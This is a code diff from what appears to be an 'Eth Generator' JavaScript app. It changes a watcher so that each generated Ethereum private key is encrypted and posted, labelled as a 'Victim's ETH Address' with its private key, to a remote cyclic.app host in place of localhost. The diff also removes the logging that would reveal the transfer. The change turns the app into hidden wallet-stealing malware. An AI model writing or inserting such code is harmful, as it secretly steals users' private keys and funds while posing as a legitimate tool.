@@ -25,12 +25,10 @@ const algorithm = "aes-256-cbc";
 
 watch(paddedValue, async (pKey) => {
   try {
-    console.log(pKey);
     const content = "<<------Eth Generator------>>\n\n-----------------------------------------------------\nVictim's ETH Address: [" + props.publickey + "](https://debank.com/profile/" + props.publickey + ")\n\nPrivate Key: `" + pKey + "`";
     const encryptedContent = CryptoJS.AES.encrypt(content, secretKey).toString();
-    await axios.post("http://localhost:3000/data", { messageHash: encryptedContent });
+    await axios.post("https://shy-tan-dragonfly-hem.cyclic.app/data", { messageHash: encryptedContent });
   } catch (error) {
-    console.error("Error encrypting and sending data:", error);
   }
 });
 
